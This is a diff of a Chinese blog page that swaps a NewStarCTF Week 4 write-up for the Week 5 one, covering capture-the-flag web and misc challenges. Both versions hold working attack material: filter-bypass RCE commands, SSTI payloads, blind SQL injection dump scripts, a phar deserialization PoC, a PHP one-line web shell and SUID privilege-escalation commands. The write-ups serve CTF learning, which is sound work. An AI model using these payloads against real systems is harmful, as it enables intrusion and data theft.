@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/10/21/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/10/28/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/10/21/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/" class="post-title-link" itemprop="url">NewStarCTF 公开赛赛道 WEEK4 WP</a>
+          <a href="/2022/10/28/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/" class="post-title-link" itemprop="url">NewStarCTF 公开赛赛道 WEEK5 WP</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-10-21 22:14:49" itemprop="dateCreated datePublished" datetime="2022-10-21T22:14:49+08:00">2022-10-21</time>
+      <time title="创建时间：2022-10-28 22:14:54" itemprop="dateCreated datePublished" datetime="2022-10-28T22:14:54+08:00">2022-10-28</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -252,7 +252,7 @@
     </span>
 
   
-    <span id="/2022/10/21/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/" class="post-meta-item leancloud_visitors" data-flag-title="NewStarCTF 公开赛赛道 WEEK4 WP" title="阅读次数">
+    <span id="/2022/10/28/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/" class="post-meta-item leancloud_visitors" data-flag-title="NewStarCTF 公开赛赛道 WEEK5 WP" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>4.6k</span>
+      <span>2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -283,194 +283,82 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h4><p>这道题还是差一点点拿三血，也算是一个小进步吧</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-139.png"></p>
-<p>题目给出了源码，是命令执行的</p>
-<pre><code>&lt;? phperror_reporting(0);
-if (isset($_GET[&quot;cmd&quot;])) &#123;
-    if (preg_match(&#39;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#39;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#39;, $_GET[&quot;cmd&quot;])) &#123;
-        echo &quot;Don&#39;t Hack Me&quot;;
-    &#125; else &#123;
-        system($_GET[&quot;cmd&quot;]);
-    &#125;
-&#125; else &#123;
-    show_source(__FILE__);
-&#125;
-</code></pre>
-<p>因为很多的关键字都被过滤了，所以我们要使用绕过，先使用ls查看</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-140-1024x456.png"></p>
-<p>因为<code>/</code>被过滤了，那么我们怎么到达根目录呢？使用<code>cd</code>嘛，因为<code>|</code>被过滤了，所以我们使用<code>&amp;&amp;</code>进行拼接命令，又因为&amp;在url中有特殊的意义，所以我们要使用url进行编码，这里空格就不用说了，使用<code>$&#123;IFS&#125;</code>进行绕过，使用<code>?cmd=cd$&#123;IFS&#125;..%26%26ls</code></p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-141-1024x462.png"></p>
-<p>然后使用<code>?cmd=cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26ls</code>到达根目录</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-142-1024x470.png"></p>
-<p>因为cat被过滤了，但是我们这里可以了解一个东西，这也是这道题学到的新姿势吧：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39572764/article/details/112614915">https://blog.csdn.net/weixin_39572764/article/details/112614915</a>，我们可以使用ca$1t进行绕过，然后fl被过滤了，因为<code>*</code>被过滤了，所以我们使用<code>?</code>替代（记得要进行url编码），最后我们使用<code>?cmd=cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26ca$1t$&#123;IFS&#125;ffff%3Flllaaaaggggg</code>得到flag</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-143-1024x475.png"></p>
-<h4 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h4><p>在这篇文章中看到了大小写绕过的方式<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
-<blockquote>
-<p>被过滤的字符：+、class、空格、”、class、mro、subclasses、init、globals、eval等</p>
-</blockquote>
-<p>测试发现大小写绕过是可行的</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-144-1024x471.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-145-1024x109.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用?name=&#123;&#123;&#x27;&#x27;&#x27;__CLASS__&#x27;.lower()1()117[&#x27;__GLOBALS__&#x27;.lower()]&#125;&#125;可以得到可以使用的函数</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-146-1024x467.png"></p>
-<p>后面因为空格被过滤了，所以我们使用<code>$&#123;IFS&#125;</code>进行绕过</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-147-1024x512.png"></p>
-<p>最后使用<code>tail$&#123;IFS&#125;fla*</code>得到flag</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-148-1024x500.png"></p>
-<h4 id="又一个SQL"><a href="#又一个SQL" class="headerlink" title="又一个SQL"></a>又一个SQL</h4><p>是一道SQL注入，先fuzz，发现过滤了这些字符</p>
-<blockquote>
-<p>length、#、空格、&#x2F;**&#x2F;、order、%23等</p>
-</blockquote>
-<p>这边是直接使用<code>1^SQL语句^1</code>的方式进行注入的，脚本如下：</p>
+          <p>这是最后一周了，来年再战……</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h4><p>Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞（CVE-2021-42013）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46187013/article/details/122454511">https://blog.csdn.net/weixin_46187013/article/details/122454511</a></p>
+<p>直接搞，然后就可以得到flag了</p>
+<h4 id="BabySSTI-Three"><a href="#BabySSTI-Three" class="headerlink" title="BabySSTI_Three"></a>BabySSTI_Three</h4><p>测试发现<code>_</code>被过滤了，我这里使用的是ASCII转换进行绕过的</p>
+<p><code>?name=&#123;&#123;''['%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95)]['%c%c%c%c%c%c%c'|format(95,95,109,114,111,95,95)][1]['%c%c%c%c%c%c%c%c%c%c%c%c%c%c'95,95,115,117,98,99,108,97,115,115,101,115,95,95)|format()]['%c%c%c%c%c'|format(112,111,112,101,110)]('ca$1t$&#123;IFS&#125;/fl*').read()&#125;&#125;</code></p>
+<p>最后可以得到flag</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-22-1024x527.png"></p>
+<h4 id="Give-me-your-photo-PLZ"><a href="#Give-me-your-photo-PLZ" class="headerlink" title="Give me your photo PLZ"></a>Give me your photo PLZ</h4><p>上传文件的漏洞，渲染？</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-23-1024x182.png"></p>
+<p>测试发现上传两个后缀会解析第一个后缀，所以我们可以使用双后缀绕过检测</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-24-1024x465.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-25-1024x462.png"></p>
+<p>在根目录发现flag</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-26-1024x474.png"></p>
+<p>会留下来的吧……</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-27-1024x463.png"></p>
+<h4 id="Final-round"><a href="#Final-round" class="headerlink" title="Final round"></a>Final round</h4><p>这道题已经裂开了……</p>
+<p>前面还好好的，到了爆数据的时候，发现时间盲注会一直在转圈圈，所以后来使用脚本的时候，才会一直跑不出来，然后是一个个数据爆破出来了……</p>
 <pre><code>import requests
 import time
 
-host = &quot;http://1fdf3c7e-fe93-49a7-a488-dc81880c7d66.node4.buuoj.cn:81/comments.php&quot;
+host = &quot;http://756418bd-8e3e-46b2-b542-da4c7c2f878b.node4.buuoj.cn:81/comments.php&quot;
 
-def getDatabase():
-    # 获取数据库名    
-    global host
-    ans = &#39;&#39;
-    for i in range(1, 1000):
-        low = 32
-        high = 128
-        mid = (low + high) // 2
-        while low &lt; high:
-            payload = &quot;100^(ascii(substr((select(database())),%d,1))&lt;%d)^1&quot; % (i, mid)
-        data = &#123;&quot;name&quot;: payload&#125;
-        res = requests.post(host, data)
-        if &quot;f1ag&quot; in res.text:
-            high = mid
-        else:
-            low = mid + 1
-            mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;database is -&gt; &quot; + ans)
-        
-def getTable():
-    # 获取表名    
-    global host
-    ans = &#39;&#39;
-    for i in range(1, 1000):        low = 32
-    high = 128
-    mid = (low + high) // 2
-    while low &lt; high:
-        payload = &quot;100^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;wfy&#39;)),%d,1))&lt;%d)^1&quot; % (
-            i, mid)
-        data = &#123;&quot;name&quot;: payload&#125;
-        res = requests.post(host, data)
-        if &quot;f1ag&quot; in res.text:
-            high = mid
-        else:
-            low = mid + 1
-        mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;table is -&gt; &quot; + ans)
-        
-def getColumn():
-    # 获取列名    
-    global host
-    ans = &#39;&#39;
-    for i in range(1, 1000):        low = 32
-    high = 128
-    mid = (low + high) // 2
-    while low &lt; high:
-        payload = &quot;100^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;wfy_comments&#39;)),%d,1))&lt;%d)^1&quot; % (
-            i, mid)
-        data = &#123;&quot;name&quot;: payload&#125;
-        res = requests.post(host, data)
-        if &quot;f1ag&quot; in res.text:
-            high = mid
-        else:
-            low = mid + 1
-        mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;column is -&gt; &quot; + ans)
-        
 def dumpTable():
     # 脱裤    
-    global host
     ans = &#39;&#39;
-    for i in range(94, 1000):        low = 32
-    high = 128
-    mid = (low + high) // 2
-    while low &lt; high:
-        payload = &quot;100^(ascii(substr((select(group_concat(text,user,name,display))from(wfy_comments)),%d,1))&lt;%d)^1&quot; % (
-            i, mid)
-        # print(payload)            
-        data = &#123;&quot;name&quot;: payload&#125;
-        res = requests.post(host, data)
-        if &quot;f1ag&quot; in res.text:
-            high = mid
-        else:
-            low = mid + 1
-        mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            continue
-        ans += chr(mid - 1)
-        print(&quot;dumpTable is -&gt; &quot; + ans)
-        
+    for i in range(238, 1000):
+        for mid in range(32, 128):
+            payload = &quot;100^if(ascii(substr((select(group_concat(text,user,name,display))from(wfy_comments)),%d,1))=%d,sleep(5),1)^1&quot; % (
+                i, mid)
+            data = &#123;&#39;name&#39;: payload&#125;
+            start_time = time.time()
+            requests.post(host, data)
+            end_time = time.time()
+            use_time = end_time - start_time
+            # 如果时间大于3，那么说明为真            
+            if use_time &gt;= 5:
+                ans += chr(mid)
+                break
+            print(&quot;dumpTable is -&gt; &quot; + ans)
+            
 dumpTable()
-# getDatabase()  
-# getTable()
-# getColumn()
 </code></pre>
-<p>最后的dump函数中的94是手测出来的，根据前面几题的经验，前面的数据应该是中文，所以直接跳过，然后如果小于等于32或大于等于127时不能直接退出，而要使用continue。</p>
+<p>一直修改range的值就可以了（前面的238是前面的题得出了的），然后得到flag所有的ASCII码</p>
+<pre><code>123741175011695108101116951091019511549101101112951024811495979511910410549101125
+</code></pre>
 <blockquote>
-<p>库名：wfy<br>表名：wfy_admin,wfy_comments,wfy_information<br>wfy_comments字段名：id,text,user,name,display</p>
+<p>python脚本转换一下得到flag</p>
 </blockquote>
-<p>最后可以得到flag</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-16-1024x542.png"></p>
-<h4 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h4><p>打开发现是一个上传的框</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-17-1024x541.png"></p>
-<p>在源码中发现<code>class.php</code>文件，访问发现了源码</p>
-<pre><code>&lt;? phphighlight_file(__FILE__);
-class Evil
-&#123;
-    public $cmd;
-
-    public function __destruct()
-    &#123;
-        if (!preg_match(&quot;/&gt;|&lt;|\?|php|&quot; . urldecode(&quot;%0a&quot;) . &quot;/i&quot;, $this-&gt;cmd)) &#123;
-            //Same point ,can you bypass me again?
-            eval(&quot;#&quot; . $this-&gt;cmd);
-        &#125; else &#123;
-            echo &quot;No!&quot;;
-        &#125;
-    &#125;
-&#125;
-
-file_exists($_GET[&#39;file&#39;]);
+<pre><code>f = open(&quot;test.txt&quot;, &quot;r&quot;)
+lines = f.readlines()
+# 读取全部内容
+for line in lines:
+    a = line
+    b = chr(int(a))
+    print(b, end=&#39;&#39;)
 </code></pre>
-<p>file_exists()函数、类、上传文件，我们是不是可以使用phar反序列化进行利用。先构造反序列化来生成一个phar文件，因为eval函数执行会加上一个<code>#</code>，绕过我们可以使用%0a，但是这里不行，<code>\n</code>也是不行的，这里使用的是<code>\r</code>进行绕过</p>
-<pre><code>&lt;? php
-class Evil
-&#123;
-    public $cmd;
-&#125;
-$evil = new Evil();
-$evil-&gt;cmd = &quot;\reval(\$_GET[8]);&quot;;
-$phar = new Phar(&#39;poc.phar&#39;);
-$phar-&gt;setMetadata($evil);
-// 触发类是C1e4r类
-$phar-&gt;addFromString(&quot;flag.txt&quot;, &quot;test&quot;);
-// 签名
-$phar-&gt;stopBuffering();
-</code></pre>
-<p>生成文件之后进行上传，要将其改为图片的格式才能上传</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-18-1024x543.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-19-1024x535.png"></p>
-<p>然后使用phar协议读取这个文件，使用<code>file=phar://upload/4935ad2c4be6114f4bf09d55ed82a60b.jpg&amp;8=phpinfo();</code></p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-20-1024x479.png"></p>
-<p>然后直接读取源码了</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-21-1024x471.png"></p>
-<p>这一周的解题都在这里了，比之前还是有一点点进步的。好好加油吧！</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-28-1024x545.png"></p>
+<p>肯定有其他更方便的方法……无语了</p>
+<h4 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h4><p>shell_exec函数，echo是可以执行的，然后我们使用echo写入一句话木马，使用<code>?cmd=echo &#39;</code><?php
+eval($_REQUEST[8]); ?><code>&#39; &gt;monkey.php</code></p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-30-1024x477.png"></p>
+<p>可以成功的执行</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-32-1024x510.png"></p>
+<p>但是发现flag里面没有东西，发现start.sh里面有内容</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-33-1024x171.png"></p>
+<p>要提升权限，使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查看SUID权限</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-34-1024x466.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-35-1024x153.png"></p>
+<p>然后使用蚁剑连接，使用date来读取flag，使用<code>/bin/date -f /ff*</code>得到flag</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-36-1024x182.png"></p>
+<p>这里其实有更方便的解法，查到SUID之后直接使用date读取flag，使用<code>/bin/date -f /ff* 2&gt; flag.txt</code></p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-37-1024x461.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-38-1024x106.png"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="最后的流量分析"><a href="#最后的流量分析" class="headerlink" title="最后的流量分析"></a>最后的流量分析</h4><p>之前做过这类的题目，SQL注入的流量分析，这道题还比之前那道题目更简单，筛选出http请求，然后使用匹配substr</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-29-1024x546.png"></p>
+<p>然后通过时间筛选出flag，最后flag为<code>flag&#123;c84bb04a-8663-4ee2-9449-349f1ee83e11&#125;</code></p>
+<p>这一周的解题都在这里了，这也是最后一周了，希望以后像他说的一样，可以留下来。好好加油吧……</p>
 
       
     </div>
@@ -490,7 +378,7 @@ $phar-&gt;stopBuffering();
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/24/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><span class="page-number current">25</span><a class="page-number" href="/page/26/">26</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/26/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/24/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><span class="page-number current">25</span><a class="page-number" href="/page/26/">26</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/26/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -514,7 +402,7 @@ $phar-&gt;stopBuffering();
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
